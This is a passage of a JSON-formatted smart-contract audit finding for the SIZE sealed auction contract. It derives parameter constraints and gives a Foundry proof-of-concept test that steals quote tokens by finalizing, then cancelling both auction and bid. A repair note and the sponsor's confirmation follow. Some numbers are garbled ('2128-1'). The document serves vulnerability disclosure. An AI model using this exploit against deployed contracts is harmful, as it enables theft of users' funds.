(data.previousQuotePerBase != FixedPointMathLib.mulDivDown(clearingQuote, type(uint128).max, clearingBase)) {\n                revert InvalidCalldata();\n            }\n\nSince clearingQuote must equal UINT128_MAX, we must satisfy:\n(2&ast;&ast;128-1) &ast; (2&ast;&ast;128-1) / clearingBase = quoteAmount &ast; (2&ast;&ast;128-1) / baseAmount. The solution I found was setting clearingBase to (2&ast;&ast;128-1) and quoteAmount = baseAmount.\n\nWe also have constraints on reserveQuotePerBase. In createAuction:\n\n    if (\n        FixedPointMathLib.mulDivDown(\n            auctionParams.minimumBidQuote, type(uint128).max, auctionParams.totalBaseAmount\n        )  auctionParams.reserveQuotePerBase\n    ) {\n        revert InvalidReserve();\n    }\n\nWhile in finalize():\n\n    // Only fill if above reserve price\n    if (quotePerBase < data.reserveQuotePerBase) continue;\n\nAnd an important constraint on quoteAmount and minimumBidQuote:\n\n    if (quoteAmount == 0 || quoteAmount == type(uint128).max || quoteAmount < a.params.minimumBidQuote) {\n        revert InvalidBidAmount();\n    }\n\nMerging them gives us two equations to substitute variables in:\n\n1.  minimumBidQuote / totalBaseAmount < reserveQuotePerBase <= UINT128_MAX / clearingBase\n2.  quoteAmount  minimumBidQuote\n\nIn the POC I've crafted parameters to steal 2&ast;&ast;30 quote tokens, around 1000 in USDC denomination. With the above equations, increasing or decreasing the stolen amount is simple.\n\n\nAn attacker can steal all tokens held in the SIZE auction contract.\n\n\nCopy the following code in SizeSealed.t.sol\n\n    function testAttack() public {\n        quoteToken = new MockERC20(\"USD Coin\", \"USDC\", 6);\n        baseToken = new MockERC20(\"DAI stablecoin \", \"DAI\", 18);\n        // Bootstrap auction contract with some funds\n        baseToken.mint(address(auction), 1e20);\n        quoteToken.mint(address(auction), 1e12);\n        // Create attacker\n        MockSeller attacker_seller  = new MockSeller(address(auction), quoteToken, baseToken);\n        MockBuyer attacker_buyer = new MockBuyer(address(auction), quoteToken, baseToken);\n        // Print attacker balances\n        uint256 balance_quote;\n        uint256 balance_base;\n        (balance_quote, balance_base) = attacker_seller.balances();\n        console.log(\"Starting seller balance: \", balance_quote, balance_base);\n        (balance_quote, balance_base) = attacker_buyer.balances();\n        console.log('Starting buyer balance: ', balance_quote, balance_base);\n        // Create auction\n        uint256 auction_id = attacker_seller.createAuction(\n            232,  // totalBaseAmount\n            2120, // reserveQuotePerBase\n            220, // minimumBidQuote\n            uint32(block.timestamp), // startTimestamp\n            uint32(block.timestamp + 1),  // endTimestamp\n            uint32(block.timestamp + 1), // vestingStartTimestamp\n            uint32(block.timestamp + 1), // vestingEndTimestamp\n            0 // cliffPercent\n        );\n        // Bid on auction\n        attacker_buyer.setAuctionId(auction_id);\n        attacker_buyer.bidOnAuction(\n            230, // baseAmount\n            230  // quoteAmount\n        );\n        // Finalize with clearingQuote = clearingBase = 2128-1\n        // Will transfer unsold base amount + matched quote amount\n        uint256[] memory bidIndices = new uint[(1);\n        bidIndices[0] = 0;\n        vm.warp(block.timestamp + 10);\n        attacker_seller.finalize(bidIndices, 2128-1, 2128-1);\n        // Cancel auction\n        // Will transfer back sold base amount\n        attacker_seller.cancelAuction();\n        // Cancel bid\n        // Will transfer back to buyer quoteAmount\n        attacker_buyer.cancel();\n        // Net profit of quoteAmount tokens of quoteToken\n        (balance_quote, balance_base) = attacker_seller.balances();\n        console.log(\"End seller balance: \", balance_quote, balance_base);\n        (balance_quote, balance_base) = attacker_buyer.balances();\n        console.log('End buyer balance: ', balance_quote, balance_base);\n    }\n\n\nManual audit, foundry tests\n\n",
                "Repair": "\nDo not trust the value of lowestQuote when determining the finalize state, use a dedicated state variable for it.\n\n\nRagePit (SIZE) confirmed(https://github.com/code-423n4/2022-11-size-findings/issues/252#issuecomment-1316061426)\n\n\n*\n\n \n\n"
            }
        ]
    }
]